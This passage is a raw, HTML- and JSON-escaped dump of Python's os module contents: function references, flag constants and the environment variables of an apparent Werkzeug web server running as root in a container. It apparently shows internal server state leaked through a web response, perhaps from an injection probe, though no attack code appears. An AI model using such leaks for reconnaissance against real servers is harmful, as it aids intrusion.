\u0026#39;urandom\u0026#39;, \u0026#39;utime\u0026#39;, \u0026#39;wait\u0026#39;, \u0026#39;wait3\u0026#39;, \u0026#39;wait4\u0026#39;, \u0026#39;waitid\u0026#39;, \u0026#39;waitid_result\u0026#39;, \u0026#39;waitpid\u0026#39;, \u0026#39;waitstatus_to_exitcode\u0026#39;, \u0026#39;write\u0026#39;, \u0026#39;writev\u0026#39;, \u0026#39;makedirs\u0026#39;, \u0026#39;removedirs\u0026#39;, \u0026#39;renames\u0026#39;, \u0026#39;walk\u0026#39;, \u0026#39;fwalk\u0026#39;, \u0026#39;execl\u0026#39;, \u0026#39;execle\u0026#39;, \u0026#39;execlp\u0026#39;, \u0026#39;execlpe\u0026#39;, \u0026#39;execvp\u0026#39;, \u0026#39;execvpe\u0026#39;, \u0026#39;getenv\u0026#39;, \u0026#39;supports_bytes_environ\u0026#39;, \u0026#39;environb\u0026#39;, \u0026#39;getenvb\u0026#39;, \u0026#39;P_WAIT\u0026#39;, \u0026#39;P_NOWAIT\u0026#39;, \u0026#39;P_NOWAITO\u0026#39;, \u0026#39;spawnv\u0026#39;, \u0026#39;spawnve\u0026#39;, \u0026#39;spawnvp\u0026#39;, \u0026#39;spawnvpe\u0026#39;, \u0026#39;spawnl\u0026#39;, \u0026#39;spawnle\u0026#39;, \u0026#39;spawnlp\u0026#39;, \u0026#39;spawnlpe\u0026#39;, \u0026#39;popen\u0026#39;], \u0026#39;_exists\u0026#39;: \u0026lt;function _exists at 0x7fceecd1dd00\u0026gt;, \u0026#39;_get_exports_list\u0026#39;: \u0026lt;function _get_exports_list at 0x7fceecd1de40\u0026gt;, \u0026#39;name\u0026#39;: \u0026#39;posix\u0026#39;, \u0026#39;linesep\u0026#39;: \u0026#39;\\n\u0026#39;, \u0026#39;stat\u0026#39;: \u0026lt;built-in function stat\u0026gt;, \u0026#39;access\u0026#39;: \u0026lt;built-in function access\u0026gt;, \u0026#39;ttyname\u0026#39;: \u0026lt;built-in function ttyname\u0026gt;, \u0026#39;chdir\u0026#39;: \u0026lt;built-in function chdir\u0026gt;, \u0026#39;chmod\u0026#39;: \u0026lt;built-in function chmod\u0026gt;, \u0026#39;fchmod\u0026#39;: \u0026lt;built-in function fchmod\u0026gt;, \u0026#39;chown\u0026#39;: \u0026lt;built-in function chown\u0026gt;, \u0026#39;fchown\u0026#39;: \u0026lt;built-in function fchown\u0026gt;, \u0026#39;lchown\u0026#39;: \u0026lt;built-in function lchown\u0026gt;, \u0026#39;chroot\u0026#39;: \u0026lt;built-in function chroot\u0026gt;, \u0026#39;ctermid\u0026#39;: \u0026lt;built-in function ctermid\u0026gt;, \u0026#39;getcwd\u0026#39;: \u0026lt;built-in function getcwd\u0026gt;, \u0026#39;getcwdb\u0026#39;: \u0026lt;built-in function getcwdb\u0026gt;, \u0026#39;link\u0026#39;: \u0026lt;built-in function link\u0026gt;, \u0026#39;listdir\u0026#39;: \u0026lt;built-in function listdir\u0026gt;, \u0026#39;lstat\u0026#39;: \u0026lt;built-in function lstat\u0026gt;, \u0026#39;mkdir\u0026#39;: \u0026lt;built-in function mkdir\u0026gt;, \u0026#39;nice\u0026#39;: \u0026lt;built-in function nice\u0026gt;, \u0026#39;getpriority\u0026#39;: \u0026lt;built-in function getpriority\u0026gt;, \u0026#39;setpriority\u0026#39;: \u0026lt;built-in function setpriority\u0026gt;, \u0026#39;posix_spawn\u0026#39;: \u0026lt;built-in function posix_spawn\u0026gt;, \u0026#39;posix_spawnp\u0026#39;: \u0026lt;built-in function posix_spawnp\u0026gt;, \u0026#39;readlink\u0026#39;: \u0026lt;built-in function readlink\u0026gt;, \u0026#39;copy_file_range\u0026#39;: \u0026lt;built-in function copy_file_range\u0026gt;, \u0026#39;splice\u0026#39;: \u0026lt;built-in function splice\u0026gt;, \u0026#39;rename\u0026#39;: \u0026lt;built-in function rename\u0026gt;, \u0026#39;replace\u0026#39;: \u0026lt;built-in function replace\u0026gt;, \u0026#39;rmdir\u0026#39;: \u0026lt;built-in function rmdir\u0026gt;, \u0026#39;symlink\u0026#39;: \u0026lt;built-in function symlink\u0026gt;, \u0026#39;system\u0026#39;: \u0026lt;built-in function system\u0026gt;, \u0026#39;umask\u0026#39;: \u0026lt;built-in function umask\u0026gt;, \u0026#39;uname\u0026#39;: \u0026lt;built-in function uname\u0026gt;, \u0026#39;unlink\u0026#39;: \u0026lt;built-in function unlink\u0026gt;, \u0026#39;remove\u0026#39;: \u0026lt;built-in function remove\u0026gt;, \u0026#39;utime\u0026#39;: \u0026lt;built-in function utime\u0026gt;, \u0026#39;times\u0026#39;: \u0026lt;built-in function times\u0026gt;, \u0026#39;execv\u0026#39;: \u0026lt;built-in function execv\u0026gt;, \u0026#39;execve\u0026#39;: \u0026lt;built-in function execve\u0026gt;, \u0026#39;fork\u0026#39;: \u0026lt;built-in function fork\u0026gt;, \u0026#39;register_at_fork\u0026#39;: \u0026lt;built-in function register_at_fork\u0026gt;, \u0026#39;sched_get_priority_max\u0026#39;: \u0026lt;built-in function sched_get_priority_max\u0026gt;, \u0026#39;sched_get_priority_min\u0026#39;: \u0026lt;built-in function sched_get_priority_min\u0026gt;, \u0026#39;sched_getparam\u0026#39;: \u0026lt;built-in function sched_getparam\u0026gt;, \u0026#39;sched_getscheduler\u0026#39;: \u0026lt;built-in function sched_getscheduler\u0026gt;, \u0026#39;sched_rr_get_interval\u0026#39;: \u0026lt;built-in function sched_rr_get_interval\u0026gt;, \u0026#39;sched_setparam\u0026#39;: \u0026lt;built-in function sched_setparam\u0026gt;, \u0026#39;sched_setscheduler\u0026#39;: \u0026lt;built-in function sched_setscheduler\u0026gt;, \u0026#39;sched_yield\u0026#39;: \u0026lt;built-in function sched_yield\u0026gt;, \u0026#39;sched_setaffinity\u0026#39;: \u0026lt;built-in function sched_setaffinity\u0026gt;, \u0026#39;sched_getaffinity\u0026#39;: \u0026lt;built-in function sched_getaffinity\u0026gt;, \u0026#39;openpty\u0026#39;: \u0026lt;built-in function openpty\u0026gt;, \u0026#39;login_tty\u0026#39;: \u0026lt;built-in function login_tty\u0026gt;, \u0026#39;forkpty\u0026#39;: \u0026lt;built-in function forkpty\u0026gt;, \u0026#39;getegid\u0026#39;: \u0026lt;built-in function getegid\u0026gt;, \u0026#39;geteuid\u0026#39;: \u0026lt;built-in function geteuid\u0026gt;, \u0026#39;getgid\u0026#39;: \u0026lt;built-in function getgid\u0026gt;, \u0026#39;getgrouplist\u0026#39;: \u0026lt;built-in function getgrouplist\u0026gt;, \u0026#39;getgroups\u0026#39;: \u0026lt;built-in function getgroups\u0026gt;, \u0026#39;getpid\u0026#39;: \u0026lt;built-in function getpid\u0026gt;, \u0026#39;getpgrp\u0026#39;: \u0026lt;built-in function getpgrp\u0026gt;, \u0026#39;getppid\u0026#39;: \u0026lt;built-in function getppid\u0026gt;, \u0026#39;getuid\u0026#39;: \u0026lt;built-in function getuid\u0026gt;, \u0026#39;getlogin\u0026#39;: \u0026lt;built-in function getlogin\u0026gt;, \u0026#39;kill\u0026#39;: \u0026lt;built-in function kill\u0026gt;, \u0026#39;killpg\u0026#39;: \u0026lt;built-in function killpg\u0026gt;, \u0026#39;setuid\u0026#39;: \u0026lt;built-in function setuid\u0026gt;, \u0026#39;seteuid\u0026#39;: \u0026lt;built-in function seteuid\u0026gt;, \u0026#39;setreuid\u0026#39;: \u0026lt;built-in function setreuid\u0026gt;, \u0026#39;setgid\u0026#39;: \u0026lt;built-in function setgid\u0026gt;, \u0026#39;setegid\u0026#39;: \u0026lt;built-in function setegid\u0026gt;, \u0026#39;setregid\u0026#39;: \u0026lt;built-in function setregid\u0026gt;, \u0026#39;setgroups\u0026#39;: \u0026lt;built-in function setgroups\u0026gt;, \u0026#39;initgroups\u0026#39;: \u0026lt;built-in function initgroups\u0026gt;, \u0026#39;getpgid\u0026#39;: \u0026lt;built-in function getpgid\u0026gt;, \u0026#39;setpgrp\u0026#39;: \u0026lt;built-in function setpgrp\u0026gt;, \u0026#39;wait\u0026#39;: \u0026lt;built-in function wait\u0026gt;, \u0026#39;wait3\u0026#39;: \u0026lt;built-in function wait3\u0026gt;, \u0026#39;wait4\u0026#39;: \u0026lt;built-in function wait4\u0026gt;, \u0026#39;waitid\u0026#39;: \u0026lt;built-in function waitid\u0026gt;, \u0026#39;waitpid\u0026#39;: \u0026lt;built-in function waitpid\u0026gt;, \u0026#39;pidfd_open\u0026#39;: \u0026lt;built-in function pidfd_open\u0026gt;, \u0026#39;getsid\u0026#39;: \u0026lt;built-in function getsid\u0026gt;, \u0026#39;setsid\u0026#39;: \u0026lt;built-in function setsid\u0026gt;, \u0026#39;setpgid\u0026#39;: \u0026lt;built-in function setpgid\u0026gt;, \u0026#39;tcgetpgrp\u0026#39;: \u0026lt;built-in function tcgetpgrp\u0026gt;, \u0026#39;tcsetpgrp\u0026#39;: \u0026lt;built-in function tcsetpgrp\u0026gt;, \u0026#39;open\u0026#39;: \u0026lt;built-in function open\u0026gt;, \u0026#39;close\u0026#39;: \u0026lt;built-in function close\u0026gt;, \u0026#39;closerange\u0026#39;: \u0026lt;built-in function closerange\u0026gt;, \u0026#39;device_encoding\u0026#39;: \u0026lt;built-in function device_encoding\u0026gt;, \u0026#39;dup\u0026#39;: \u0026lt;built-in function dup\u0026gt;, \u0026#39;dup2\u0026#39;: \u0026lt;built-in function dup2\u0026gt;, \u0026#39;lockf\u0026#39;: \u0026lt;built-in function lockf\u0026gt;, \u0026#39;lseek\u0026#39;: \u0026lt;built-in function lseek\u0026gt;, \u0026#39;read\u0026#39;: \u0026lt;built-in function read\u0026gt;, \u0026#39;readv\u0026#39;: \u0026lt;built-in function readv\u0026gt;, \u0026#39;pread\u0026#39;: \u0026lt;built-in function pread\u0026gt;, \u0026#39;preadv\u0026#39;: \u0026lt;built-in function preadv\u0026gt;, \u0026#39;write\u0026#39;: \u0026lt;built-in function write\u0026gt;, \u0026#39;writev\u0026#39;: \u0026lt;built-in function writev\u0026gt;, \u0026#39;pwrite\u0026#39;: \u0026lt;built-in function pwrite\u0026gt;, \u0026#39;pwritev\u0026#39;: \u0026lt;built-in function pwritev\u0026gt;, \u0026#39;sendfile\u0026#39;: \u0026lt;built-in function sendfile\u0026gt;, \u0026#39;fstat\u0026#39;: \u0026lt;built-in function fstat\u0026gt;, \u0026#39;isatty\u0026#39;: \u0026lt;built-in function isatty\u0026gt;, \u0026#39;pipe\u0026#39;: \u0026lt;built-in function pipe\u0026gt;, \u0026#39;pipe2\u0026#39;: \u0026lt;built-in function pipe2\u0026gt;, \u0026#39;mkfifo\u0026#39;: \u0026lt;built-in function mkfifo\u0026gt;, \u0026#39;mknod\u0026#39;: \u0026lt;built-in function mknod\u0026gt;, \u0026#39;major\u0026#39;: \u0026lt;built-in function major\u0026gt;, \u0026#39;minor\u0026#39;: \u0026lt;built-in function minor\u0026gt;, \u0026#39;makedev\u0026#39;: \u0026lt;built-in function makedev\u0026gt;, \u0026#39;ftruncate\u0026#39;: \u0026lt;built-in function ftruncate\u0026gt;, \u0026#39;truncate\u0026#39;: \u0026lt;built-in function truncate\u0026gt;, \u0026#39;posix_fallocate\u0026#39;: \u0026lt;built-in function posix_fallocate\u0026gt;, \u0026#39;posix_fadvise\u0026#39;: \u0026lt;built-in function posix_fadvise\u0026gt;, \u0026#39;putenv\u0026#39;: \u0026lt;built-in function putenv\u0026gt;, \u0026#39;unsetenv\u0026#39;: \u0026lt;built-in function unsetenv\u0026gt;, \u0026#39;strerror\u0026#39;: \u0026lt;built-in function strerror\u0026gt;, \u0026#39;fchdir\u0026#39;: \u0026lt;built-in function fchdir\u0026gt;, \u0026#39;fsync\u0026#39;: \u0026lt;built-in function fsync\u0026gt;, \u0026#39;sync\u0026#39;: \u0026lt;built-in function sync\u0026gt;, \u0026#39;fdatasync\u0026#39;: \u0026lt;built-in function fdatasync\u0026gt;, \u0026#39;WCOREDUMP\u0026#39;: \u0026lt;built-in function WCOREDUMP\u0026gt;, \u0026#39;WIFCONTINUED\u0026#39;: \u0026lt;built-in function WIFCONTINUED\u0026gt;, \u0026#39;WIFSTOPPED\u0026#39;: \u0026lt;built-in function WIFSTOPPED\u0026gt;, \u0026#39;WIFSIGNALED\u0026#39;: \u0026lt;built-in function WIFSIGNALED\u0026gt;, \u0026#39;WIFEXITED\u0026#39;: \u0026lt;built-in function WIFEXITED\u0026gt;, \u0026#39;WEXITSTATUS\u0026#39;: \u0026lt;built-in function WEXITSTATUS\u0026gt;, \u0026#39;WTERMSIG\u0026#39;: \u0026lt;built-in function WTERMSIG\u0026gt;, \u0026#39;WSTOPSIG\u0026#39;: \u0026lt;built-in function WSTOPSIG\u0026gt;, \u0026#39;fstatvfs\u0026#39;: \u0026lt;built-in function fstatvfs\u0026gt;, \u0026#39;statvfs\u0026#39;: \u0026lt;built-in function statvfs\u0026gt;, \u0026#39;confstr\u0026#39;: \u0026lt;built-in function confstr\u0026gt;, \u0026#39;sysconf\u0026#39;: \u0026lt;built-in function sysconf\u0026gt;, \u0026#39;fpathconf\u0026#39;: \u0026lt;built-in function fpathconf\u0026gt;, \u0026#39;pathconf\u0026#39;: \u0026lt;built-in function pathconf\u0026gt;, \u0026#39;abort\u0026#39;: \u0026lt;built-in function abort\u0026gt;, \u0026#39;getloadavg\u0026#39;: \u0026lt;built-in function getloadavg\u0026gt;, \u0026#39;urandom\u0026#39;: \u0026lt;built-in function urandom\u0026gt;, \u0026#39;setresuid\u0026#39;: \u0026lt;built-in function setresuid\u0026gt;, \u0026#39;setresgid\u0026#39;: \u0026lt;built-in function setresgid\u0026gt;, \u0026#39;getresuid\u0026#39;: \u0026lt;built-in function getresuid\u0026gt;, \u0026#39;getresgid\u0026#39;: \u0026lt;built-in function getresgid\u0026gt;, \u0026#39;getxattr\u0026#39;: \u0026lt;built-in function getxattr\u0026gt;, \u0026#39;setxattr\u0026#39;: \u0026lt;built-in function setxattr\u0026gt;, \u0026#39;removexattr\u0026#39;: \u0026lt;built-in function removexattr\u0026gt;, \u0026#39;listxattr\u0026#39;: \u0026lt;built-in function listxattr\u0026gt;, \u0026#39;get_terminal_size\u0026#39;: \u0026lt;built-in function get_terminal_size\u0026gt;, \u0026#39;cpu_count\u0026#39;: \u0026lt;built-in function cpu_count\u0026gt;, \u0026#39;get_inheritable\u0026#39;: \u0026lt;built-in function get_inheritable\u0026gt;, \u0026#39;set_inheritable\u0026#39;: \u0026lt;built-in function set_inheritable\u0026gt;, \u0026#39;get_blocking\u0026#39;: \u0026lt;built-in function get_blocking\u0026gt;, \u0026#39;set_blocking\u0026#39;: \u0026lt;built-in function set_blocking\u0026gt;, \u0026#39;scandir\u0026#39;: \u0026lt;built-in function scandir\u0026gt;, \u0026#39;fspath\u0026#39;: \u0026lt;built-in function fspath\u0026gt;, \u0026#39;getrandom\u0026#39;: \u0026lt;built-in function getrandom\u0026gt;, \u0026#39;memfd_create\u0026#39;: \u0026lt;built-in function memfd_create\u0026gt;, \u0026#39;eventfd\u0026#39;: \u0026lt;built-in function eventfd\u0026gt;, \u0026#39;eventfd_read\u0026#39;: \u0026lt;built-in function eventfd_read\u0026gt;, \u0026#39;eventfd_write\u0026#39;: \u0026lt;built-in function eventfd_write\u0026gt;, \u0026#39;waitstatus_to_exitcode\u0026#39;: \u0026lt;built-in function waitstatus_to_exitcode\u0026gt;, \u0026#39;environ\u0026#39;: environ({\u0026#39;HOSTNAME\u0026#39;: \u0026#39;2a88d9e3b6e8\u0026#39;, \u0026#39;PYTHON_PIP_VERSION\u0026#39;: \u0026#39;22.3\u0026#39;, \u0026#39;HOME\u0026#39;: \u0026#39;/root\u0026#39;, \u0026#39;GPG_KEY\u0026#39;: \u0026#39;A035C8C19219BA821ECEA86B64E628F8D684696D\u0026#39;, \u0026#39;PYTHON_GET_PIP_URL\u0026#39;: \u0026#39;https://github.com/pypa/get-pip/raw/66030fa03382b4914d4c4d0896961a0bdeeeb274/public/get-pip.py\u0026#39;, \u0026#39;PATH\u0026#39;: \u0026#39;/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0026#39;, \u0026#39;LANG\u0026#39;: \u0026#39;C.UTF-8\u0026#39;, \u0026#39;PYTHON_VERSION\u0026#39;: \u0026#39;3.11.0\u0026#39;, \u0026#39;PYTHON_SETUPTOOLS_VERSION\u0026#39;: \u0026#39;65.5.0\u0026#39;, \u0026#39;PWD\u0026#39;: \u0026#39;/code\u0026#39;, \u0026#39;PYTHON_GET_PIP_SHA256\u0026#39;: \u0026#39;1e501cf004eac1b7eb1f97266d28f995ae835d30250bec7f8850562703067dc6\u0026#39;, \u0026#39;WERKZEUG_SERVER_FD\u0026#39;: \u0026#39;3\u0026#39;}), \u0026#39;F_OK\u0026#39;: 0, \u0026#39;R_OK\u0026#39;: 4, \u0026#39;W_OK\u0026#39;: 2, \u0026#39;X_OK\u0026#39;: 1, \u0026#39;NGROUPS_MAX\u0026#39;: 65536, \u0026#39;TMP_MAX\u0026#39;: 238328, \u0026#39;WCONTINUED\u0026#39;: 8, \u0026#39;WNOHANG\u0026#39;: 1, \u0026#39;WUNTRACED\u0026#39;: 2, \u0026#39;O_RDONLY\u0026#39;: 0, \u0026#39;O_WRONLY\u0026#39;: 1, \u0026#39;O_RDWR\u0026#39;: 2, \u0026#39;O_NDELAY\u0026#39;: 2048, \u0026#39;O_NONBLOCK\u0026#39;: 2048, \u0026#39;O_APPEND\u0026#39;: 1024, \u0026#39;O_DSYNC\u0026#39;: 4096, \u0026#39;O_RSYNC\u0026#39;: 1052672, \u0026#39;O_SYNC\u0026#39;: 1052672, \u0026#39;O_NOCTTY\u0026#39;: 256, \u0026#39;O_CREAT\u0026#39;: 64, \u0026#39;O_EXCL\u0026#39;: 128, \u0026#39;O_TRUNC\u0026#39;: 512, \u0026#39;O_LARGEFILE\u0026#39;: 0, \u0026#39;O_PATH\u0026#39;: 2097152, \u0026#39;O_TMPFILE\u0026#39;: 4259840, \u0026#39;PRIO_PROCESS\u0026#39;: 0, \u0026#39;PRIO_PGRP\u0026#39;: 1, \u0026#39;PRIO_USER\u0026#39;: 2, \u0026#39;O_CLOEXEC\u0026#39;: 524288, \u0026#39;O_ACCMODE\u0026#39;: 3, \u0026#39;O_FSYNC\u0026#39;: 1052672, \u0026#39;SEEK_HOLE\u0026#39;: 4, \u0026#39;SEEK_DATA\u0026#39;: 3, \u0026#39;O_ASYNC\u0026#39;: 8192, \u0026#39;O_DIRECT\u0026#39;: 16384, \u0026#39;O_DIRECTORY\u0026#39;: 65536, \u0026#39;O_NOFOLLOW\u0026#39;: 131072, \u0026#39;O_NOATIME\u0026#39;: 262144, \u0026#39;EX_OK\u0026#39;: 0, \u0026#39;EX_USAGE\u0026#39;: 64, \u0026#39;EX_DATAERR\u0026#39;: 65, \u0026#39;EX_NOINPUT\u0026#39;: 66, \u0026#39;EX_NOUSER\u0026#39;: 67, \u0026#39;EX_NOHOST\u0026#39;: 68, \u0026#39;EX_UNAVAILABLE\u0026#39;: 69, \u0026#39;EX_SOFTWARE\u0026#39;: 70, \u0026#39;EX_OSERR\u0026#39;: 71, \u0026#39;EX_OSFILE\u0026#39;: 72, \u0026#39;EX_CANTCREAT\u0026#39;: 73, \u0026#39;EX_IOERR\u0026#39;: 74, \u0026#39;EX_TEMPFAIL\u0026#39;: 75, \u0026#39;EX_PROTOCOL\u0026#39;: 76, \u0026#39;EX_NOPERM\u0026#39;: 77, \u0026#39;EX_CONFIG\u0026#39;: 78, \u0026#39;ST_RDONLY\u0026#39;: 1, \u0026#39;ST_NOSUID\u0026#39;: 2, \u0026#39;ST_NODEV\u0026#39;: 4, \u0026#39;ST_NOEXEC\u0026#39;: 8, \u0026#39;ST_SYNCHRONOUS\u0026#39;: 16, \u0026#39;ST_MANDLOCK\u0026#39;: 64, \u0026#39;ST_WRITE\u0026#39;: 128, \u0026#39;ST_APPEND\u0026#39;: 256, \u0026#39;ST_NOATIME\u0026#39;: 1024, \u0026#39;ST_NODIRATIME\u0026#39;: 2048, \u0026#39;ST_RELATIME\u0026#39;: 4096, \u0026#39;POSIX_FADV_NORMAL\u0026#39;: 0, \u0026#39;POSIX_FADV_SEQUENTIAL\u0026#39;: 2, \u0026#39;POSIX_FADV_RANDOM\u0026#39;: 1, \u0026#39;POSIX_FADV_NOREUSE\u0026#39;: 5, \u0026#39;POSIX_FADV_WILLNEED\u0026#39;: 3, \u0026#39;POSIX_FADV_DONTNEED\u0026#39;: 4, \u0026#39;P_PID\u0026#39;: 1, \u0026#39;P_PGID\u0026#39;: 2, \u0026#39;P_ALL\u0026#39;: 0, \u0026#39;P_PIDFD\u0026#39;: 3, \u0026#39;WEXITED\u0026#39;: 4, \u0026#39;WNOWAIT\u0026#39;: 16777216, \u0026#39;WSTOPPED\u0026#39;: 2, \u0026#39;CLD_EXITED\u0026#39;: 1, \u0026#39;CLD_KILLED\u0026#39;: 2, \u0026#39;CLD_DUMPED\u0026#39;: 3, \u0026#39;CLD_TRAPPED\u0026#39;: 4, \u0026#39;CLD_STOPPED\u0026#39;: 5, \u0026#39;CLD_CONTINUED\u0026#39;: 6, \u0026#39;F_LOCK\u0026#39;: 1, \u0026#39;F_TLOCK\u0026#39;: 2, \u0026#39;F_ULOCK\u0026#39;: 0, \u0026#39;F_TEST\u0026#39;: 3, \u0026#39;RWF_DSYNC\u0026#39;: 2, \u0026#39;RWF_HIPRI\u0026#39;: 1, \u0026#39;RWF_SYNC\u0026#39;: 4, \u0026#39;RWF_NOWAIT\u0026#39;: 8, \u0026#39;RWF_APPEND\u0026#39;: 16, \u0026#39;SPLICE_F_MOVE\u0026#39;: 1, \u0026#39;SPLICE_F_NONBLOCK\u0026#39;: 2, \u0026#39;SPLICE_F_MORE\u0026#39;: 4, \u0026#39;POSIX_SPAWN_OPEN\u0026#39;: 0, \u0026#39;POSIX_SPAWN_CLOSE\u0026#39;: 1, \u0026#39;POSIX_SPAWN_DUP2\u0026#39;: 2, \u0026#39;SCHED_OTHER\u0026#39;: 0, \u0026#39;SCHED_FIFO\u0026#39;: 1, \u0026#39;SCHED_RR\u0026#39;: 2, \u0026#39;SCHED_BATCH\u0026#39;: 3, \u0026#39;SCHED_IDLE\u0026#39;: 5, \u0026#39;SCHED_RESET_ON_FORK\u0026#39;: 1073741824, \u0026#39;XATTR_CREATE\u0026#39;: 1, \u0026#39;XATTR_REPLACE\u0026#39;: 2, \u0026#39;XATTR_SIZE_MAX\u0026#39;: 65536, \u0026#39;RTLD_LAZY\u0026#39;: 1, \u0026#39;RTLD_NOW\u0026#39;: 2, \u0026#39;RTLD_GLOBAL\u0026#39;: 256, \u0026#39;RTLD_LOCAL\u0026#39;: 0, \u0026#39;RTLD_NODELETE\u0026#39;: 4096, \u0026#39;RTLD_NOLOAD\u0026#39;: 4, \u0026#39;RTLD_DEEPBIND\u0026#39;: 8, \u0026#39;GRND_RANDOM\u0026#39;: 2, \u0026#39;GRND_NONBLOCK\u0026#39;: 1, \u0026#39;MFD_CLOEXEC\u0026#39;: 1, \u0026#39;MFD_ALLOW_SEALING\u0026#39;: 2, \u0026#39;MFD_HUGETLB\u0026#39;: 4, \u0026#39;MFD_HUGE_SHIFT\u0026#39;: 26, \u0026#39;MFD_HUGE_MASK\u0026#39;: 63, \u0026#39;MFD_HUGE_64KB\u0026#39;: 1073741824, \u0026#39;MFD_HUGE_512KB\u0026#39;: 1275068416, \u0026#39;MFD_HUGE_1MB\u0026#39;: 1342177280, \u0026#39;MFD_HUGE_2MB\u0026#39;: 1409286144, \u0026#39;MFD_HUGE_8MB\u0026#39;: 1543503872, \u0026#39;MFD_HUGE_16MB\u0026#39;: 1610612736, \u0026#39;MFD_HUGE_32MB\u0026#39;: 1677721600, \u0026#39;MFD_HUGE_256MB\u0026#39;: 1879048192, \u0026#39;MFD_HUGE_512MB\u0026#39;: 1946157056, \u0026#39;MFD_HUGE_1GB\u0026#39;: 2013265920, \u0026#39;MFD_HUGE_2GB\u0026#39;: 2080374784, \u0026#39;MFD_HUGE_16GB\u0026#39;: -2013265920, \u0026#39;EFD_CLOEXEC\u0026#39;: 524288, \u0026#39;EFD_NONBLOCK\u0026#39;: 2048, \u0026#39;EFD_SEMAPHORE\u0026#39;: 1, \u0026#39;pathconf_names\u0026#39;: {\u0026#39;PC_ALLOC_SIZE_MIN\u0026#39;: 18, \u0026#39;PC_ASYNC_IO\u0026#39;: 10, \u0026#39;PC_CHOWN_RESTRICTED\u0026#39;: 6, \u0026#39;PC_FILESIZEBITS\u0026#39;: 13, \u0026#39;PC_LINK_MAX\u0026#39;: 0, \u0026#39;PC_MAX_CANON\u0026#39;: 1, \u0026#39;PC_MAX_INPUT\u0026#39;: 2, \u0026#39;PC_NAME_MAX\u0026#39;: 3, \u0026#39;PC_NO_TRUNC\u0026#39;: 7, \u0026#39;PC_PATH_MAX\u0026#39;: 4, \u0026#39;PC_PIPE_BUF\u0026#39;: 5, \u0026#39;PC_PRIO_IO\u0026#39;: 11, \u0026#39;PC_REC_INCR_XFER_SIZE\u0026#39;: 14, \u0026#39;PC_REC_MAX_XFER_SIZE\u0026#39;: 15, \u0026#39;PC_REC_MIN_XFER_SIZE\u0026#39;: 16, \u0026#39;PC_REC_XFER_ALIGN\u0026#39;: 17, \u0026#39;PC_SOCK_MAXBUF\u0026#39;: 12, \u0026#39;PC_SYMLINK_MAX\u0026#39;: 19, \u0026#39;PC_SYNC_IO\u0026#39;: 9, \u0026#39;PC_VDISABLE\u0026#39;: 8}, \u0026#39;confstr_names\u0026#39;: {\u0026#39;CS_GNU_LIBC_VERSION\u0026#39;: 2, \u0026#39;CS_GNU_LIBPTHREAD_VERSION\u0026#39;: 3, \u0026#39;CS_LFS64_CFLAGS\u0026#39;: 1004, \u0026#39;CS_LFS64_LDFLAGS\u0026#39;: 1005, \u0026#39;CS_LFS64_LIBS\u0026#39;: 1006, \u0026#39;CS_LFS64_LINTFLAGS\u0026#39;: 1007, \u0026#39;CS_LFS_CFLAGS\u0026#39;: 1000, \u0026#39;CS_LFS_LDFLAGS\u0026#39;: 1001, \u0026#39;CS_LFS_LIBS\u0026#39;: 1002, \u0026#39;CS_LFS_LINTFLAGS\u0026#39;: 1003, \u0026#39;CS_PATH\u0026#39;: 0, \u0026#39;CS_XBS5_ILP32_OFF32_CFLAGS\u0026#39;: 1100, \u0026#39;CS_XBS5_ILP32_OFF32_LDFLAGS\u0026#39;: 1101, \u0026#39;CS_XBS5_ILP32_OFF32_LIBS\u0026#39;: 1102, \u0026#39;CS_XBS5_ILP32_OFF32_LINTFLAGS\u0026#39;: 1103, \u0026#39;CS_XBS5_ILP32_OFFBIG_CFLAGS\u0026#39;: 1104, \u0026#39;CS_XBS5_ILP32_OFFBIG_LDFLAGS\u0026#39;: 1105, \u0026#39;CS_XBS5_ILP32_OFFBIG_LIBS\u0026#39;: 1106, \u0026#39;CS_XBS5_ILP32_OFFBIG_LINTFLAGS\u0026#39;: 1107, \u0026#39;CS_XBS5_LP64_OFF64_CFLAGS\u0026#39;: 1108, \u0026#39;CS_XBS5_LP64_OFF64_LDFLAGS\u0026#39;: 1109, \u0026#39;CS_XBS5_LP64_OFF64_LIBS\u0026#39;: 1110, \u0026#39;CS_XBS5_LP64_OFF64_LINTFLAGS\u0026#39;: 1111, \u0026#39;CS_XBS5_LPBIG_OFFBIG_CFLAGS\u0026#39;: 1112, \u0026#39;CS_XBS5_LPBIG_OFFBIG_LDFLAGS\u0026#39;: 1113, \u0026#39;CS_XBS5_LPBIG_OFFBIG_LIBS\u0026#39;: 1114, \u0026#39;CS_XBS5_LPBIG_OFFBIG_LINTFLAGS\u0026#39;: 1115}, \u0026#39;sysconf_names\u0026#39;: {\u0026#39;SC_2_CHAR_TERM\u0026#39;: 95, \u0026#39;SC_2_C_BIND\u0026#39;: 47, \u0026#39;SC_2_C_DEV\u0026#39;: 48, \u0026#39;SC_2_C_VERSION\u0026#39;: 96, \u0026#39;SC_2_FORT_DEV\u0026#39;: 49, \u0026#39;SC_2_FORT_RUN\u0026#39;: 50, \u0026#39;SC_2_LOCALEDEF\u0026#39;: 52, \u0026#39;SC_2_SW_DEV\u0026#39;: 51, \u0026#39;SC_2_UPE\u0026#39;: 97, \u0026#39;SC_2_VERSION\u0026#39;: 46, \u0026#39;SC_AIO_LISTIO_MAX\u0026#39;: 23, \u0026#39;SC_AIO_MAX\u0026#39;: 24, \u0026#39;SC_AIO_PRIO_DELTA_MAX\u0026#39;: 25, \u0026#39;SC_ARG_MAX\u0026#39;: 0, \u0026#39;SC_ASYNCHRONOUS_IO\u0026#39;: 12, \u0026#39;SC_ATEXIT_MAX\u0026#39;: 87, \u0026#39;SC_AVPHYS_PAGES\u0026#39;: 86, \u0026#39;SC_BC_BASE_MAX\u0026#39;: 36, \u0026#39;SC_BC_DIM_MAX\u0026#39;: 37, \u0026#39;SC_BC_SCALE_MAX\u0026#39;: 38, \u0026#39;SC_BC_STRING_MAX\u0026#39;: 39, \u0026#39;SC_CHARCLASS_NAME_MAX\u0026#39;: 45, \u0026#39;SC_CHAR_BIT\u0026#39;: 101, \u0026#39;SC_CHAR_MAX\u0026#39;: 102, \u0026#39;SC_CHAR_MIN\u0026#39;: 103, \u0026#39;SC_CHILD_MAX\u0026#39;: 1, \u0026#39;SC_CLK_TCK\u0026#39;: 2, \u0026#39;SC_COLL_WEIGHTS_MAX\u0026#39;: 40, \u0026#39;SC_DELAYTIMER_MAX\u0026#39;: 26, \u0026#39;SC_EQUIV_CLASS_MAX\u0026#39;: 41, \u0026#39;SC_EXPR_NEST_MAX\u0026#39;: 42, \u0026#39;SC_FSYNC\u0026#39;: 15, 